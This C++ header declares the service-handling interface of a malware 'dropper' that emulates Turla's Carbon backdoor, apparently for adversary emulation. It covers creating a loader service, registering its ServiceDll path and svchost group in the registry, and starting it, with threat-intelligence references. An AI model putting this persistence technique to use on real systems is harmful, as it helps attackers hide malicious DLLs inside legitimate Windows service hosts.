/*
 * Handle service creation for the dropper.
 *
 * CTI references:
 * [1] https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 * [2] https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 * [3] https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */

#ifndef SERVICE_HANDLER_H_
#define SERVICE_HANDLER_H_

#include <string>
#include <windows.h>
#include <winreg.h>
#include <winsvc.h>

#define FAIL_GET_SCM_HANDLE 0x200
#define FAIL_INSTALL_SVC 0x201
#define FAIL_REG_CREATE_KEY_DLL_PATH 0x202
#define FAIL_REG_SET_VAL_DLL_PATH 0x203
#define FAIL_REG_CREATE_KEY_SVCHOST_GROUP 0x204
#define FAIL_REG_SET_VAL_SVCHOST_GROUP 0x205
#define FAIL_OPEN_SERVICE 0x206
#define FAIL_QUERY_SERVICE_STATUS 0x207
#define FAIL_START_SERVICE 0x208
#define FAIL_SERVICE_DID_NOT_START_IN_TIME 0x209

namespace service_handler {

// Turla sets service details based on the name of the loader DLL [3]
extern const LPCTSTR kLoaderSvcName;
extern const LPCTSTR kLoaderSvcDisplayName;
extern const LPCTSTR kSvcBinPath;
extern const LPCTSTR kSvcParamSubKey;
extern const LPCTSTR kSvchostSubKey;
extern const char* kSvchostGroupValueData;
extern const LPCTSTR kSvchostGroupName;

// Define a struct for desired service settings to reduce number of parameters for CreateServiceWrapper
struct ServiceSettings {
    LPCTSTR     lpServiceName;
    LPCTSTR     lpDisplayName;
    DWORD       dwDesiredAccess;
    DWORD       dwServiceType;
    DWORD       dwStartType;
    DWORD       dwErrorControl;
    LPCTSTR     lpBinaryPathname;
    LPCTSTR     lpLoadOrderGroup;
    LPDWORD     lpdwTagId;
    LPCTSTR     lpDependencies;
    LPCTSTR     lpServiceStartName;
    LPCTSTR     lpPassword;
};

// Interface for service handler API calls to be wrapped. Will be used in source code and test files.
class SvcCallWrapperInterface {
public:
    SvcCallWrapperInterface(){}
    virtual ~SvcCallWrapperInterface(){}
    virtual SC_HANDLE CreateServiceWrapper(
        SC_HANDLE       hSCManager,
        ServiceSettings *svcSettings
    ) = 0;
    
    virtual SC_HANDLE OpenSCManagerWrapper(
        LPCTSTR     lpMachineName,
        LPCTSTR     lpDatabaseName,
        DWORD       dwDesiredAccess
    ) = 0;
    
    virtual BOOL CloseServiceHandleWrapper(SC_HANDLE hSCObject) = 0;
    
    virtual BOOL StartServiceWrapper(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCTSTR *lpServiceArgVectors) = 0;
    
    virtual SC_HANDLE OpenServiceWrapper(SC_HANDLE hSCManager, LPCTSTR lpServiceName, DWORD dwDesiredAccess) = 0;
    
    virtual BOOL QueryServiceStatusExWrapper(
        SC_HANDLE      hService,
        SC_STATUS_TYPE InfoLevel,
        SERVICE_STATUS_PROCESS* lpBuffer,
        DWORD          cbBufSize,
        LPDWORD        pcbBytesNeeded
    ) = 0;
    
    virtual LSTATUS RegCreateKeyWrapper(
        HKEY                        hKey,
        LPCTSTR                     lpSubKey,
        DWORD                       Reserved,
        LPTSTR                      lpClass,
        DWORD                       dwOptions,
        REGSAM                      samDesired,
        const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
        PHKEY                       phkResult,
        LPDWORD                     lpdwDisposition
    ) = 0;
    
    virtual LSTATUS RegSetKeyValueWrapper(
        HKEY    hKey,
        LPCTSTR lpSubKey,
        LPCTSTR lpValueName,
        DWORD   dwType,
        LPCVOID lpData,
        DWORD   cbData
    ) = 0;
    
    virtual LSTATUS RegCloseKeyWrapper(HKEY hKey) = 0;
    
    virtual DWORD GetLastErrorWrapper() = 0;

    virtual void SleepWrapper(DWORD dwMilliseconds) = 0;
};

class SvcCallWrapper : public SvcCallWrapperInterface {
public:
    SC_HANDLE CreateServiceWrapper(
        SC_HANDLE       hSCManager,
        ServiceSettings *svcSettings
    );
    
    SC_HANDLE OpenSCManagerWrapper(
        LPCTSTR     lpMachineName,
        LPCTSTR     lpDatabaseName,
        DWORD       dwDesiredAccess
    );
    
    BOOL CloseServiceHandleWrapper(SC_HANDLE hSCObject);
    
    BOOL StartServiceWrapper(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCTSTR *lpServiceArgVectors);
    
    SC_HANDLE OpenServiceWrapper(SC_HANDLE hSCManager, LPCTSTR lpServiceName, DWORD dwDesiredAccess);
    
    BOOL QueryServiceStatusExWrapper(
        SC_HANDLE               hService,
        SC_STATUS_TYPE          InfoLevel,
        SERVICE_STATUS_PROCESS* lpBuffer,
        DWORD                   cbBufSize,
        LPDWORD                 pcbBytesNeeded
    );
    
    LSTATUS RegCreateKeyWrapper(
        HKEY                        hKey,
        LPCTSTR                     lpSubKey,
        DWORD                       Reserved,
        LPTSTR                      lpClass,
        DWORD                       dwOptions,
        REGSAM                      samDesired,
        const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
        PHKEY                       phkResult,
        LPDWORD                     lpdwDisposition
    );
    
    LSTATUS RegSetKeyValueWrapper(
        HKEY    hKey,
        LPCTSTR lpSubKey,
        LPCTSTR lpValueName,
        DWORD   dwType,
        LPCVOID lpData,
        DWORD   cbData
    );
    
    LSTATUS RegCloseKeyWrapper(HKEY hKey);
    
    DWORD GetLastErrorWrapper();

    void SleepWrapper(DWORD dwMilliseconds);
};

int CreateLoaderService(SvcCallWrapperInterface* svc_call_wrapper);

int SetServiceDllPath(SvcCallWrapperInterface* svc_call_wrapper, std::string dll_path);

int SetSvchostGroupValue(SvcCallWrapperInterface* svc_call_wrapper);

int StartLoaderService(SvcCallWrapperInterface* svc_call_wrapper);

} // namespace service_handler

#endif
